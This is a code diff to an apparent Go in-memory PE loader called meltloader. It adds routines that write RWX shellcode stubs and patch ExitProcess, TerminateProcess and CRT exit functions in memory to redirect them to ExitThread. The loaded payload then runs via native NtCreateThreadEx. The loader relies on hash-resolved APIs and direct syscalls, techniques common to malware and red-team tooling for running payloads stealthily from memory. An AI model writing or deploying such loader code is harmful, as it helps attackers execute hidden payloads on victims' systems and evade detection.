@@ -4,32 +4,171 @@ package pe is responsible for performing reflective loading of PE/DLL files from
 package pe 
 
 import (
-	"bytes"
-	api "github.com/carved4/go-wincall"
-	sys "github.com/carved4/go-native-syscall"
-	"github.com/Binject/debug/pe"
-	"github.com/carved4/meltloader/pkg/net"
-	"github.com/carved4/meltloader/pkg/enc"
-	"encoding/binary"
-	"fmt"
-	"io/ioutil" 
-	"unsafe"
-	"strings"
-	"strconv"
-	"runtime"
-	"runtime/debug"
-	"sync"
+    "bytes"
+    api "github.com/carved4/go-wincall"
+    sys "github.com/carved4/go-native-syscall"
+    "github.com/Binject/debug/pe"
+    "github.com/carved4/meltloader/pkg/net"
+    "github.com/carved4/meltloader/pkg/enc"
+    "encoding/binary"
+    "fmt"
+    "io/ioutil" 
+    "unsafe"
+    "strings"
+    "strconv"
+    "runtime"
+    "runtime/debug"
+    "sync"
 )
 
 type PEMapping struct {
-	BaseAddress uintptr
-	Size        uintptr
+    BaseAddress uintptr
+    Size        uintptr
 }
 
 var (
-	peRegistry = make(map[uintptr]*PEMapping)
-	peRegistryMutex sync.RWMutex
+    peRegistry = make(map[uintptr]*PEMapping)
+    peRegistryMutex sync.RWMutex
 )
+
+// global exit guard hook representation
+type exitHook struct {
+    target    uintptr
+    orig      [16]byte
+    size      uintptr
+    installed bool
+}
+
+// Observed behavior and rationale for exit guards
+// - IAT-only redirection of ExitProcess/TerminateProcess is not sufficient for all payloads;
+//   some resolve exits dynamically (GetProcAddress) or call CRT helpers (exit/_exit/_cexit).
+// - A previous attempt to also hook ntdll-level routines such as RtlExitUserProcess (and
+//   RaiseFailFastException) caused an access violation at process shutdown, as the Go runtime
+//   and OS rely on these for clean finalization.
+// - The solution that proved stable across tests: hook only user-mode/CRT exits (kernel32/
+//   kernelbase ExitProcess/TerminateProcess and MSVC/UCRT exit variants) and leave ntdll
+//   alone. This blocks payload-triggered process termination while allowing the host to exit
+//   normally via RtlExitUserProcess -> NtTerminateProcess when our loader is done.
+// - If a payload explicitly calls ntdll termination APIs, we can add an opt-in guard later,
+//   but reflective payloads typically rely on user-mode exits through the runtime/CRT.
+//
+// installGlobalExitGuards redirects process-exit style APIs to ExitThread via a small x64 stub.
+// It returns the allocated stub and the installed hooks to restore later.
+func installGlobalExitGuards() (stub uintptr, hooks []exitHook, err error) {
+    // Resolve ExitThread address via hash lookup as requested
+    k32 := api.LoadLibraryW("kernel32.dll")
+    if k32 == 0 {
+        return 0, nil, fmt.Errorf("LoadLibraryW(kernel32) failed")
+    }
+    exitThread := api.GetFunctionAddress(k32, api.GetHash("ExitThread"))
+    if exitThread == 0 {
+        return 0, nil, fmt.Errorf("GetFunctionAddress(ExitThread) failed")
+    }
+
+    // Build a tiny stub: sub rsp,0x28; xor rcx,rcx; mov rax, ExitThread; call rax; add rsp,0x28; ret
+    stubCode := []byte{
+        0x48, 0x83, 0xEC, 0x28, // sub rsp, 0x28
+        0x48, 0x31, 0xC9, // xor rcx, rcx
+        0x48, 0xB8, // mov rax, imm64
+    }
+    // append imm64 ExitThread
+    buf := make([]byte, 8)
+    binary.LittleEndian.PutUint64(buf, uint64(exitThread))
+    stubCode = append(stubCode, buf...)
+    stubCode = append(stubCode,
+        0xFF, 0xD0, // call rax
+        0x48, 0x83, 0xC4, 0x28, // add rsp,0x28
+        0xC3, // ret (should not return)
+    )
+
+    // Allocate RWX memory for stub
+    s, aerr := api.Call("kernel32.dll", "VirtualAlloc", 0, uintptr(len(stubCode)), uintptr(0x3000), uintptr(0x40))
+    if aerr != nil || s == 0 {
+        return 0, nil, fmt.Errorf("VirtualAlloc stub failed: %v", aerr)
+    }
+    stub = s
+    // Copy code
+    dst := (*[^uint32(0)]byte)(unsafe.Pointer(stub))[:len(stubCode):len(stubCode)]
+    copy(dst, stubCode)
+
+    // helper to lookup and hook a target if present
+    addHook := func(mod string, name string) {
+        if mod == "" || name == "" {
+            return
+        }
+        h := api.LoadLibraryW(mod)
+        if h == 0 {
+            return
+        }
+        addr := api.GetFunctionAddress(h, api.GetHash(name))
+        if addr == 0 {
+            return
+        }
+        // write absolute jmp: mov rax, imm64; jmp rax
+        var hk exitHook
+        hk.target = addr
+        hk.size = 12
+        // Save original bytes
+        for i := uintptr(0); i < hk.size; i++ {
+            hk.orig[i] = *(*byte)(unsafe.Pointer(addr + i))
+        }
+        // Make writable
+        var oldProt uint32
+        api.Call("kernel32.dll", "VirtualProtect", addr, uintptr(hk.size), uintptr(0x40), uintptr(unsafe.Pointer(&oldProt)))
+        // Build detour
+        det := []byte{0x48, 0xB8}
+        binary.LittleEndian.PutUint64(buf, uint64(stub))
+        det = append(det, buf...)
+        det = append(det, 0xFF, 0xE0) // jmp rax
+        for i := uintptr(0); i < hk.size; i++ {
+            *(*byte)(unsafe.Pointer(addr + i)) = det[i]
+        }
+        // Restore prot and flush icache
+        api.Call("kernel32.dll", "VirtualProtect", addr, uintptr(hk.size), uintptr(oldProt), uintptr(unsafe.Pointer(&oldProt)))
+        proc, _ := api.Call("kernel32.dll", "GetCurrentProcess")
+        api.Call("kernel32.dll", "FlushInstructionCache", proc, addr, uintptr(hk.size))
+        hk.installed = true
+        hooks = append(hooks, hk)
+    }
+
+    // Kernel32/KernelBase (user-mode exits)
+    addHook("kernel32.dll", "ExitProcess")
+    addHook("kernel32.dll", "TerminateProcess")
+    addHook("kernelbase.dll", "ExitProcess")
+    addHook("kernelbase.dll", "TerminateProcess")
+    // Do not hook NTDLL termination paths to allow clean process shutdown
+    // CRT variants
+    addHook("msvcrt.dll", "exit")
+    addHook("msvcrt.dll", "_exit")
+    addHook("msvcrt.dll", "_cexit")
+    addHook("ucrtbase.dll", "exit")
+    addHook("ucrtbase.dll", "_exit")
+    addHook("ucrtbase.dll", "_cexit")
+    addHook("vcruntime140.dll", "_cexit")
+    addHook("vcruntime140_1.dll", "_cexit")
+
+    return stub, hooks, nil
+}
+
+func uninstallGlobalExitGuards(stub uintptr, hooks []exitHook) {
+    // Restore all hooks
+    for _, hk := range hooks {
+        if !hk.installed || hk.target == 0 || hk.size == 0 {
+            continue
+        }
+        var oldProt uint32
+        api.Call("kernel32.dll", "VirtualProtect", hk.target, uintptr(hk.size), uintptr(0x40), uintptr(unsafe.Pointer(&oldProt)))
+        for i := uintptr(0); i < hk.size; i++ {
+            *(*byte)(unsafe.Pointer(hk.target + i)) = hk.orig[i]
+        }
+        api.Call("kernel32.dll", "VirtualProtect", hk.target, uintptr(hk.size), uintptr(oldProt), uintptr(unsafe.Pointer(&oldProt)))
+        proc, _ := api.Call("kernel32.dll", "GetCurrentProcess")
+        api.Call("kernel32.dll", "FlushInstructionCache", proc, hk.target, uintptr(hk.size))
+    }
+    if stub != 0 {
+        api.Call("kernel32.dll", "VirtualFree", stub, 0, uintptr(0x8000))
+    }
+}
 
 func createPEMapping(baseAddress uintptr, size uintptr) *PEMapping {
 	mapping := &PEMapping{
@@ -536,7 +675,7 @@ func peLoader(bytes0 *[]byte) (*PEMapping, error) {
 	
 	entryPointRVA := mappedNtHeader.OptionalHeader.AddressOfEntryPoint
 	
-	startAddress := imageBaseForPE + uintptr(entryPointRVA)
+    startAddress := imageBaseForPE + uintptr(entryPointRVA)
 
 	Memset(baseAddr, 0, uintptr(len(pinnedBytes)))
 	
@@ -544,11 +683,18 @@ func peLoader(bytes0 *[]byte) (*PEMapping, error) {
 	runtime.KeepAlive(bytes0)
 	runtime.KeepAlive(&pinnedBytes[0])
 	
-	var threadHandle uintptr
-	status, err = sys.NtCreateThreadEx(&threadHandle, 0x1FFFFF, 0, 0xffffffffffffffff, startAddress, 0, 0, 0, 0, 0, 0)
-	if status != 0 {
-		return nil, fmt.Errorf("[ERROR] failed to create thread (status: 0x%x, err: %v)", status, err)
-	}
+    // Guard against process-exit calls globally (install then remove after thread end)
+    stub, hooks, ierr := installGlobalExitGuards()
+    if ierr != nil {
+        // non-fatal, continue without global guards
+    }
+    defer func() { uninstallGlobalExitGuards(stub, hooks) }()
+    var threadHandle uintptr
+    status, err = sys.NtCreateThreadEx(&threadHandle, 0x1FFFFF, 0, 0xffffffffffffffff, startAddress, 0, 0, 0, 0, 0, 0)
+    if status != 0 {
+        uninstallGlobalExitGuards(stub, hooks)
+        return nil, fmt.Errorf("[ERROR] failed to create thread (status: 0x%x, err: %v)", status, err)
+    }
 
 	runtime.KeepAlive(pinnedBytes)
 	runtime.KeepAlive(bytes0)
@@ -568,7 +714,7 @@ func peLoader(bytes0 *[]byte) (*PEMapping, error) {
 	runtime.KeepAlive(bytes0)
 	runtime.KeepAlive(&pinnedBytes[0])
 	
-	sys.NtClose(threadHandle)
+    sys.NtClose(threadHandle)
 	
 	mapping := createPEMapping(imageBaseForPE, regionSize)
 	return mapping, nil	
@@ -682,90 +828,31 @@ func peThreadLoader(bytes0 *[]byte, timeoutSeconds int) (*PEMapping, error) {
 	}
 	
 	entryPointRVA := mappedNtHeader.OptionalHeader.AddressOfEntryPoint
-	startAddress := imageBaseForPE + uintptr(entryPointRVA)
-	Memset(baseAddr, 0, uintptr(len(pinnedBytes)))
+    startAddress := imageBaseForPE + uintptr(entryPointRVA)
+    Memset(baseAddr, 0, uintptr(len(pinnedBytes)))
 	
 	runtime.KeepAlive(pinnedBytes)
 	runtime.KeepAlive(bytes0)
 	runtime.KeepAlive(&pinnedBytes[0])
 	
-	_, err = api.Call("kernel32.dll", "ConvertThreadToFiber", uintptr(0))
-	if err != nil {
-		return nil, fmt.Errorf("[ERROR] failed to convert thread to fiber: %v", err)
-	}
-	
-	// when i remove this it breaks but i dont think its doing anything
-	peFiberAddr, err := api.Call("kernel32.dll", "CreateFiber", uintptr(0x100000), startAddress, uintptr(0))
-	if err != nil {
-		api.Call("kernel32.dll", "ConvertFiberToThread")
-		return nil, fmt.Errorf("[ERROR] failed to create PE fiber: %v", err)
-	}
-	api.Call("kernel32.dll", "DeleteFiber", peFiberAddr)
-	api.Call("kernel32.dll", "ConvertFiberToThread")
-	
-	var threadHandle uintptr
-	status, err = sys.NtCreateThreadEx(&threadHandle, 0x1FFFFF, 0, 0xffffffffffffffff, startAddress, 0, 0x1, 0, 0, 0, 0) // CREATE_SUSPENDED = 0x1
-	if status != 0 {
-		return nil, fmt.Errorf("[ERROR] failed to create suspended thread (status: 0x%x, err: %v)", status, err)
-	}
-	
-	exitFunctions := []string{"ExitProcess", "TerminateProcess", "exit", "_exit"}
-	originalBytesMap := make(map[uintptr][]byte)
-	
-	kernel32Handle := api.LoadLibraryW("kernel32.dll")
-	msvcrtHandle := api.LoadLibraryW("msvcrt.dll")
-	
-	for _, funcName := range exitFunctions {
-		var funcAddr uintptr
-		
-		if funcName == "exit" || funcName == "_exit" {
-			if msvcrtHandle != 0 {
-				funcHash := api.GetHash(funcName)
-				funcAddr = api.GetFunctionAddress(msvcrtHandle, funcHash)
-			}
-		} else {
-			if kernel32Handle != 0 {
-				funcHash := api.GetHash(funcName)
-				funcAddr = api.GetFunctionAddress(kernel32Handle, funcHash)
-			}
-		}
-		
-		if funcAddr != 0 {
-			originalBytes := make([]byte, 5)
-			for i := 0; i < 5; i++ {
-				originalBytes[i] = *(*byte)(unsafe.Pointer(funcAddr + uintptr(i)))
-			}
-			originalBytesMap[funcAddr] = originalBytes
-			var oldProtect uint32
-			api.Call("kernel32.dll", "VirtualProtect", funcAddr, uintptr(5), uintptr(0x40), uintptr(unsafe.Pointer(&oldProtect)))
-			nopBytes := []byte{0xC3, 0x90, 0x90, 0x90, 0x90} // RET + NOPs
-			for i, b := range nopBytes {
-				*(*byte)(unsafe.Pointer(funcAddr + uintptr(i))) = b
-			}
-		}
-	}
-	
-	status, err = sys.NtResumeThread(threadHandle, nil)
-	if status != 0 {
-		return nil, fmt.Errorf("[ERROR] failed to resume thread (status: 0x%x)", status)
-	}
-	
-	api.Call("kernel32.dll", "Sleep", uintptr(timeoutSeconds*1000)) // Convert seconds to milliseconds
-	
-	status, err = sys.NtSuspendThread(threadHandle, nil)
-	if status == 0 {
-		status, err = sys.NtTerminateThread(threadHandle, 0)
-	} 
-	
-	for funcAddr, originalBytes := range originalBytesMap {
-		var oldProtect uint32
-		api.Call("kernel32.dll", "VirtualProtect", funcAddr, uintptr(5), uintptr(0x40), uintptr(unsafe.Pointer(&oldProtect)))
-		for i, b := range originalBytes {
-			*(*byte)(unsafe.Pointer(funcAddr + uintptr(i))) = b
-		}
-	}
-	
-	sys.NtClose(threadHandle)
+    // Install global exit guards
+    stub, hooks, _ := installGlobalExitGuards()
+    defer func() { uninstallGlobalExitGuards(stub, hooks) }()
+
+    var threadHandle uintptr
+    status, err = sys.NtCreateThreadEx(&threadHandle, 0x1FFFFF, 0, 0xffffffffffffffff, startAddress, 0, 0, 0, 0, 0, 0)
+    if status != 0 {
+        uninstallGlobalExitGuards(stub, hooks)
+        return nil, fmt.Errorf("[ERROR] failed to create thread (status: 0x%x, err: %v)", status, err)
+    }
+
+    // Wait up to timeout, terminate if needed
+    waitRes, _ := api.Call("kernel32.dll", "WaitForSingleObject", threadHandle, uintptr(uint32(timeoutSeconds*1000)))
+    if waitRes == 0x00000102 { // WAIT_TIMEOUT
+        sys.NtTerminateThread(threadHandle, 0)
+    }
+
+    sys.NtClose(threadHandle)
 
 	runtime.KeepAlive(pinnedBytes)
 	runtime.KeepAlive(bytes0)
